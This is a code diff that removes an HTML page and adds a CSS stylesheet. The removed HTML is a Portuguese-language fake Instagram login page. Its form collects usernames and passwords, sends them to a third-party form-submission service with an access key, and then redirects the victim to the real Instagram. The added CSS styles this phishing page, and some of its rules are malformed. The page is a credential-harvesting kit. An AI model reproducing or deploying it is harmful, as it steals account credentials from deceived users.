@@ -1,43 +1,179 @@
-<!DOCTYPE html>
-<html lang="br">
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="style.css">
-    <title>instagram</title>
-</head>
-<body>
-    <p class="dig">português (Brasil)</p>
-     <div id="background-image"></div>
-    <section>
-        
-        <h2><img class="inst" src="instagram.png" alt="intagram"></h2>
-        <form action="https://api.staticforms.xyz/submit" method="post">
-            <label></label>
-            <input type="text" name="name" placeholder="Número de telefone, email ou nome de usuário"  required>
-            <label></label>
-            <input type="text" name="email" placeholder="Senha"  required>
-            <br>
-            <button type="submit">Entrar</button>
-           <p class="aja">Esqueceu seus dados de login<a href="#"> Obtenha ajuda para entrar</a></p> 
-           <br>
-            <p>OU</p>
-           <br>
-<div class="fece"><p><img class="fa" src="facebook.png" alt="">continua no Facebook</p></div>
+*{
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    position:static ;
+    font-family: sans-serif;
+        }
+     align-items: center;
+    justify-content: center;
 
-            <input type="hidden" name="accessKey" value="c539a53c-e8b2-4985-9be2-d5df300d8a7a">
-            <input type="hidden" name="redirectTo" value="https://www.instagram.com/instagram?igsh=MWtoOGtjODk2enVzaw==">
-        </form>
-    </section>
-    <p class="ajas">  
-    Não tem conta?<a href="#">Cadastre-se</a>
-</p>
- <script>
-        // Função para ocultar a imagem de fundo após 5 segundos
-        setTimeout(function(){
-            document.getElementById('background-image').style.display = 'none';
-        }, 7000); // 5000 milissegundos = 5 segundos
-    </script>
-</body>
-</html>
+ .p{
+     display: fixed;
+    align-items: center;
+    justify-content: center;
+ }
+ .dig{
+     margin-top:1%;
+ }
+  
+    
+    .inst{
+    width: 100%;
+    height: 100%;
+    
+}
+
+
+body{
+position:static;
+    align-items: flex-start;
+    margin: 0;
+    padding: 0;
+    height: 100%;
+    display: fixed;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    background: #ffffff;
+    flex-direction: column;
+    text-align:center ;
+}
+section{
+    
+    display: fixed;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+    padding: 10px 7.5%;
+    background: #ffffff;
+    width: 100%;
+    height:95%;
+     box-shadow: rgba(0, 0, 0, 0.4) 0px 2px 4px, rgba(0, 0, 0, 0.3) 0px 7px 13px -3px, rgba(0, 0, 0, 0.2) 0px -3px 0px inset;
+}
+section h2{
+    color: #f5f5f5;
+    font-size: 2.5rem;
+    margin: 2rem;
+}
+section form{
+    display: flex;
+    flex-direction: column;
+    width: 100%;
+}
+form label{
+    color: #f5f5f5;
+    font-size: 17px;
+    margin-bottom: 4px;
+    
+}
+form input{
+    padding: 15px;
+    outline: none;
+    border: 0;
+    margin-bottom: 20px;
+    font-size: 14px;
+    transition: all 0.5s;
+    border: 0.5px solid #080623d2;
+    border-radius: 5px;
+}
+
+}
+form textarea{
+    padding: 10px;
+    outline: none;
+    border: 0;
+    font-size: 15px;
+    margin-bottom: 30px;
+    transition: all 0.5s;
+}
+form textarea:focus{
+    border-radius: 16px;
+}
+form button{
+    padding: 15px;
+    cursor: pointer;
+    font-size: 16px;
+    background: #3897f1;
+    border: 2px solid #f5f5f5;    
+    color: #f5f5f5;
+    transition: all 1s;
+    margin-bottom: 20px;
+    border-radius: 10px;
+}
+form button:hover{
+    background: #55acff87;
+    color: #fff;
+    border-radius: 16px;
+}
+
+/*Página do Obrigado*/
+
+.main{
+   display: flex;
+   align-items: center;
+   justify-content: center;
+   min-height: 100vh;
+   background: #101026;
+   flex-direction: column;
+}
+.text{
+    font-size: 45px;
+    color: #f5f5f5;
+    margin-bottom: 30px;
+}
+.paragrafo{
+    color: #ffffff;
+    margin-bottom: 50px;
+}
+/*#f5f5f5*/
+.btn{
+    padding: 15px 55px;
+    background:#f5f5f5 ;
+    text-decoration: none;
+    color: #101026;
+    font-size: 18px;
+    transition: all 0.5s;
+}
+.btn:hover{
+    border-radius: 16px;
+}
+.fece{
+    padding: 15px 55px;
+    text-decoration: none;
+    color: #ffffff;
+    font-size: 18px;
+    transition: all 0.5s;
+    background: #3897f1;
+    border-radius: 10px;
+    align-items: center;
+    justify-content: center;
+   
+}
+ .aja{
+     font-size:12px;
+ }
+ .ajas{
+     font-size:12px;
+     margin-top:30%;
+     
+ }
+ a{
+     color:#3897f1;
+     text-decoration:none;
+ }
+ .fa{
+     width: 8%;
+    height: 8%;
+ }
+ #background-image {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-image: url('ins.jpg');
+    background-size: cover;
+    background-position: center;
+    z-index: 9999; /* Certifique-se de que está na frente de outros elementos */
+    }
